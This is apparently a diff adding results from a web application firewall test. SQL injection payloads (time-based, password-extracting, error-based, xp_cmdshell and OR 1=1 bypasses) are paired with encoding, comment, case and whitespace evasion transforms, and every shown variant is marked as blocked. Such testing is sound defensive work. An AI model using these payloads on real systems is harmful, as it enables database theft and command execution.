+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1%2527%2520AND%2520%2528SELECT%2520%252A%2520FROM%2520%2528SELECT%2528SLEEP%25285%2529%2529%2529a%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1' aNd (SeLeCt * fRoM (sElEcT(SlEeP(5)))A)--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(5)))a)--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1'#AND#(SELECT#*#FROM#(SELECT(SLEEP(5)))a)--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1'/*x*/AND/*x*/(SELECT/*x*/*/*x*/FROM/*x*/(SELECT(SLEEP(5)))a)--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1'\tAND\t(SELECT\t*\tFROM\t(SELECT(SLEEP(5)))a)--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "0x312720414e44202853454c454354202a2046524f",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29%2C1%2C1%29%29%3E0--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1%2527%2520AND%2520ASCII%2528SUBSTRING%2528%2528SELECT%2520password%2520FROM%2520users%2520LIMIT%25201%2529%252C1%252C1%2529%2529%253E0--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1' aNd aScIi(sUbStRiNg((SeLeCt pAsSwOrD FrOm uSeRs lImIt 1),1,1))>0--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1' AND ASCII(SUBSTRING((SELECT passwORd FROM users LIMIT 1),1,1))>0--",
+"transform": "case_upper_keywords",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1'/**/AND/**/ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/LIMIT/**/1),1,1))>0--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1'#AND#ASCII(SUBSTRING((SELECT#password#FROM#users#LIMIT#1),1,1))>0--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1'/*x*/AND/*x*/ASCII(SUBSTRING((SELECT/*x*/password/*x*/FROM/*x*/users/*x*/LIMIT/*x*/1),1,1))>0--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1'+AND+ASCII(SUBSTRING((SELECT+password+FROM+users+LIMIT+1),1,1))>0--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1'\tAND\tASCII(SUBSTRING((SELECT\tpassword\tFROM\tusers\tLIMIT\t1),1,1))>0--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
+"transformed": "0x312720414e442041534349492853554253545249",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "1%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20version%28%29%29%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "1%2527%2520AND%25201%253DCONVERT%2528int%252C%2528SELECT%2520version%2528%2529%2529%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "1' aNd 1=cOnVeRt(iNt,(SeLeCt vErSiOn()))--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "1'/**/AND/**/1=CONVERT(int,(SELECT/**/version()))--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "1'#AND#1=CONVERT(int,(SELECT#version()))--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "1'/*x*/AND/*x*/1=CONVERT(int,(SELECT/*x*/version()))--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "1'+AND+1=CONVERT(int,(SELECT+version()))--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "1'\tAND\t1=CONVERT(int,(SELECT\tversion()))--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "1' AND 1=CONVERT(int,(SELECT version()))--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=CONVERT(int,(SELECT version()))--",
+"transformed": "0x312720414e4420313d434f4e5645525428696e74",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "1; EXEC xp_cmdshell('dir')--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "1%253B%2520EXEC%2520xp_cmdshell%2528%2527dir%2527%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "1; eXeC Xp_cMdShElL('dIr')--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "1;/**/EXEC/**/xp_cmdshell('dir')--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "1;#EXEC#xp_cmdshell('dir')--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "1;/*x*/EXEC/*x*/xp_cmdshell('dir')--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "1;+EXEC+xp_cmdshell('dir')--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "1;\tEXEC\txp_cmdshell('dir')--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "1; EXEC xp_cmdshell('dir')--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; EXEC xp_cmdshell('dir')--",
+"transformed": "0x313b20455845432078705f636d647368656c6c28",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "1' OR '1'='1' /*",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "1%27%20OR%20%271%27%3D%271%27%20%2F%2A",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "1%2527%2520OR%2520%25271%2527%253D%25271%2527%2520%252F%252A",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "1' oR '1'='1' /*",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "1'/**/OR/**/'1'='1'/**//*",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "1'#OR#'1'='1'#/*",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "1'/*x*/OR/*x*/'1'='1'/*x*//*",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "1'+OR+'1'='1'+/*",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "1'\tOR\t'1'='1'\t/*",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "1' OR '1'='1' /*%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*",
+"transformed": "0x3127204f52202731273d273127202f2a",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "1' OR '1'='1' /*!50000",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "1%27%20OR%20%271%27%3D%271%27%20%2F%2A%2150000",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "1%2527%2520OR%2520%25271%2527%253D%25271%2527%2520%252F%252A%252150000",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "1' oR '1'='1' /*!50000",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "1'/**/OR/**/'1'='1'/**//*!50000",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "1'#OR#'1'='1'#/*!50000",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "1'/*x*/OR/*x*/'1'='1'/*x*//*!50000",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "1'+OR+'1'='1'+/*!50000",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "1'\tOR\t'1'='1'\t/*!50000",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "1' OR '1'='1' /*!50000%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1' /*!50000",
+"transformed": "0x3127204f52202731273d273127202f2a21353030",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "1' OR 1=1#",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "1%27%20OR%201%3D1%23",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "1%2527%2520OR%25201%253D1%2523",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "1' oR 1=1#",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "1'/**/OR/**/1=1#",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "1'#OR#1=1#",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "1'/*x*/OR/*x*/1=1#",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "1'+OR+1=1#",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "1'\tOR\t1=1#",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "1' OR 1=1#%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1#",
+"transformed": "0x3127204f5220313d3123",
+"transform": "hex_encode",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "1' OR 1=1/*",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "1%27%20OR%201%3D1%2F%2A",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "1%2527%2520OR%25201%253D1%252F%252A",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "1' oR 1=1/*",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "1'/**/OR/**/1=1/*",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "1'#OR#1=1/*",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "1'/*x*/OR/*x*/1=1/*",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "1'+OR+1=1/*",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "1'\tOR\t1=1/*",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "1' OR 1=1/*%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1/*",
+"transformed": "0x3127204f5220313d312f2a",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "1' OR 1=1-- -",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "1%27%20OR%201%3D1--%20-",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "1%2527%2520OR%25201%253D1--%2520-",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "1' oR 1=1-- -",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "1'/**/OR/**/1=1--/**/-",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "1'#OR#1=1--#-",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "1'/*x*/OR/*x*/1=1--/*x*/-",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "1'+OR+1=1--+-",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "1'\tOR\t1=1--\t-",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "1' OR 1=1-- -%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1-- -",
+"transformed": "0x3127204f5220313d312d2d202d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "1' OR 1=1%00",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "1%27%20OR%201%3D1%2500",
+"transform": "url_encode",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "1%2527%2520OR%25201%253D1%252500",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "1' oR 1=1%00",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "1'/**/OR/**/1=1%00",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "1'#OR#1=1%00",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "1'/*x*/OR/*x*/1=1%00",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "1'+OR+1=1%00",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "1'\tOR\t1=1%00",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "1' OR 1=1%00%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1%00",
+"transformed": "0x3127204f5220313d31253030",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1%27%20RLIKE%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1%2527%2520RLIKE%2520%2528SELECT%2520%252A%2520FROM%2520%2528SELECT%2528SLEEP%25285%2529%2529%2529a%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1' rLiKe (SeLeCt * fRoM (sElEcT(SlEeP(5)))A)--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1'/**/RLIKE/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(5)))a)--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1'#RLIKE#(SELECT#*#FROM#(SELECT(SLEEP(5)))a)--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1'/*x*/RLIKE/*x*/(SELECT/*x*/*/*x*/FROM/*x*/(SELECT(SLEEP(5)))a)--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1'+RLIKE+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1'\tRLIKE\t(SELECT\t*\tFROM\t(SELECT(SLEEP(5)))a)--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "0x312720524c494b45202853454c454354202a2046",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2CCONCAT%28version%28%29%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1%2527%2520AND%2520%2528SELECT%25201%2520FROM%2520%2528SELECT%2520COUNT%2528%252A%2529%252CCONCAT%2528version%2528%2529%252CFLOOR%2528RAND%25280%2529%252A2%2529%2529x%2520FROM%2520information_schema.tables%2520GROUP%2520BY%2520x%2529a%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1' aNd (SeLeCt 1 fRoM (sElEcT CoUnT(*),cOnCaT(VeRsIoN(),FlOoR(RaNd(0)*2))x fRoM InFoRmAtIoN_ScHeMa.tAbLeS GrOuP By x)a)--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM infORmation_schema.tables GROUP BY x)a)--",
+"transform": "case_upper_keywords",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1'/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT/**/COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x/**/FROM/**/information_schema.tables/**/GROUP/**/BY/**/x)a)--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1'#AND#(SELECT#1#FROM#(SELECT#COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x#FROM#information_schema.tables#GROUP#BY#x)a)--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1'/*x*/AND/*x*/(SELECT/*x*/1/*x*/FROM/*x*/(SELECT/*x*/COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x/*x*/FROM/*x*/information_schema.tables/*x*/GROUP/*x*/BY/*x*/x)a)--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x+FROM+information_schema.tables+GROUP+BY+x)a)--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1'\tAND\t(SELECT\t1\tFROM\t(SELECT\tCOUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x\tFROM\tinformation_schema.tables\tGROUP\tBY\tx)a)--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+"transformed": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--%00",
+"transform": "null_byte_suffix",
